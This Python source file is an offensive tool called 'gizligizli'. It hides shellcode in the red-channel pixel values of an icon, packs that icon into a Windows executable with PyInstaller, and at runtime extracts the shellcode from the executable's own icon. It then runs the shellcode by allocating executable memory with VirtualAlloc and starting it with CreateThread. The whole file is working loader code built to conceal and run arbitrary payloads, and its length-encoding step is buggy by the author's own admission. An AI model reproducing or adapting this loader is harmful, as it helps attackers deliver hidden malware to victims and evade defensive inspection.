from PIL import Image
import argparse
import PyInstaller
import PyInstaller.__main__
import sys
import os
import time
import lief
from io import BytesIO
import ctypes

verbose = False

def hide(shellcode_file, source_file, target_file):
    """
    Takes a shellcode file and a source file and returns a target file

    Example:
    >>> sc = hide("shellcode.bin", "source.ico", "embedded.ico")

    """
    # open shellcode file
    with open(shellcode_file, "rb") as f:
        shellcode = f.read()

    
    im = Image.open(source_file)
    width, height = im.size

    # first pixel's r+g+b sum value will the length of the shellcode
    print(f"[HIDE] shellcode length: {len(shellcode)}")

    # this is just temporary, 
    sc_len = len(shellcode)
    while True:
        # if you happen to see this garbage pls unsee 
        # TODO: if sclen exceeds 0xff*3 move to next pixel
        if sc_len > 254:
            im.putpixel((0,0), (255, 0, 0))
        else:
            im.putpixel((0,0), (sc_len, 0, 0))
            break
            
        sc_len -= 255

        if sc_len > 254:
            im.putpixel((0,0), (255, 255, 0))
        else:
            im.putpixel((0,0), (255, sc_len, 0))
            break
            
        sc_len -= 255

        if sc_len > 254:
            # this condition is not possible, buggy
            im.putpixel((0,0), (255, 255, 255))
        else:
            im.putpixel((0,0), (255, 255, sc_len))
            break

    # we will hide the shellcode in the r values

    sc_counter = 0
    for j in range(height):
        for i in range(width):
            # skip firstpixel
            if i == 0 and j == 0:
                continue
            updated_pix = list(im.getpixel((i,j)))

            updated_pix[0] = shellcode[sc_counter]
            im.putpixel((i,j), tuple(updated_pix))
            sc_counter += 1
            if sc_counter >= len(shellcode):
                break
        if sc_counter >= len(shellcode):
            break
            
    im.save(target_file)
    im.close()
    return


def unhide(file):
    """
    Takes a file or a image stream and returns the shellcode string
    
    Example:
    >>> sc = unhide("shellcode.png")
    >>> sc
    >>> "2315e6a08e999543fe2b02...."
    """


    if "PngImageFile" in str(type(file)):
        im = file
    else:
        im = Image.open(file)
    pix = im.load()
    #image.show()
    width, height = im.size
    
    # first pixel's r+g+b sum value will be the length of the shellcode

    # We distribute shellcode into 3 pixels
    pix = list(im.getpixel((0,0)))
    sc_len = sum(pix[:3])
    print(f"[UNHIDE] shellcode length: {sc_len}")
    # we will hide the shellcode in the g values
    
    sc_counter = 0
    shellcode = []
    for j in range(height):
        for i in range(width):
            # skip firstpixel
            if i == 0 and j == 0:
                continue
            shellcode.append(im.getpixel((i,j))[0])
            sc_counter += 1
            if sc_counter >= sc_len:
                break
        if sc_counter >= sc_len:
            break

    # convert int array to hex

    sc_str = "" 
    for i in shellcode:
        if i < 16:
            sc_str += f"0{hex(i)[2:]}"
        else:
            sc_str += hex(i)[2:]
    im.close()
    return sc_str


def save_icon_from_exe(file_path, target_file):
    """
    Takes exe file and saves the icon that in the size of 48x48 into target file

    Example:
    >>> save_icon_from_exe("test.exe", "icon.ico")
    """
    pe = lief.parse(file_path)
    
    #first_icon = pe.resources_manager.icons[0] # first icon is generally the biggest one.
    # first_icon.save("icon.ico")
    for icon in pe.resources_manager.icons:
        if icon.width == 48 and icon.height == 48:
            icon.save(target_file)
            break
        if verbose:
            print(f"{icon.height}x{icon.width}")
        #print(icon)
        #print(icon.pixels)
        #print(icon.save("icon.ico"))
        # ['bit_count', 'color_count', 'height', 'id', 'lang', 'pixels', 'planes', 'reserved', 'save', 'sublang', 'width']
    return None


def extract_icon_from_exe(file_path):
    """
    Takes a exe file and returns the icon as a image stream

    Example:
    >>> extract_icon_from_exe("test.exe")

    """

    
    pe = lief.parse(file_path)
    
    #first_icon = pe.resources_manager.icons[0] # first icon is generally the biggest one.
    # first_icon.save("icon.ico")
    for icon in pe.resources_manager.icons:
        if verbose:
            print(f"{icon.height}x{icon.width}")
        if icon.width == 48 and icon.height == 48:
            if verbose:
                print(f"bit_count: {icon.bit_count}")
                print(f"color_count: {icon.color_count}")
                print(f"height: {icon.height}")
                print(f"width: {icon.width}")
                print(f"id: {icon.id}")
                print(f"lang: {icon.lang}")
                print(f"planes: {icon.planes}")
                print(f"reserved: {icon.reserved}")
                print(f"sublang: {icon.sublang}")
            return icon.pixels # returns png not fucking pixels
        #print(icon.save("icon.ico"))
        # ['bit_count', 'color_count', 'height', 'id', 'lang', 'pixels', 'planes', 'reserved', 'save', 'sublang', 'width']
    return None

if __name__ == "__main__":
    #hide(shellcode, "downloaded_48x48.ico","shellcode_embedded.ico")
    #sc = unhide("shellcode_embedded.ico")
    #sc = unhide("icon.ico")
    #print(f"unhide: \n{sc}")

    if getattr(sys, 'frozen', False):
        # means we are running from an executable
        # unhide and execute
        # TODO: replace gizligizli.exe to be the name of the executable
        png = extract_icon_from_exe("gizligizli.exe")
        
        # convert int of pixels to raw bytes
        png = [bytes([png[i]]) for i in range(0, len(png))]
        # join pixels to form a string
        raw_png = b''.join(png)
        # print(f"pixels: \n{raw_png}")
        image = Image.open(BytesIO(raw_png))

        sc = unhide(image)
        print(f"unhide: \n{sc}")
        sc = bytes.fromhex(sc)

        
        ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
        rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(sc), len(sc))
        time.sleep(3)
        handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
        ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

    else:
        # else do the magic 
        pass


    parser = argparse.ArgumentParser()
    parser.add_argument("-sc", "--shellcode", dest="sc_path", default="shellcode.bin", help="shellcode.bin location")
    parser.add_argument("-i", "--icon", dest="icon_path", default="default.ico", help="Custom icon location, default is default.ico")
    parser.add_argument("-v", "--verbose", dest="verbose", default=False, action='store_true', help="verbosity")

    args = parser.parse_args()

    verbose = args.verbose


    target_icon = "embedded.ico"

    hide(args.sc_path, args.icon_path, target_icon)
    print("[MAIN] shellcode embedded succesfully")

    print("[MAIN] creating the executable")
    PyInstaller.__main__.run([
        '--onefile',
        f"--icon={target_icon}",
        'gizligizli.py', # TODO: maybe change this to the name of the python file

    ])
    print("[MAIN] Executable created, dist\\gizligizli.exe")
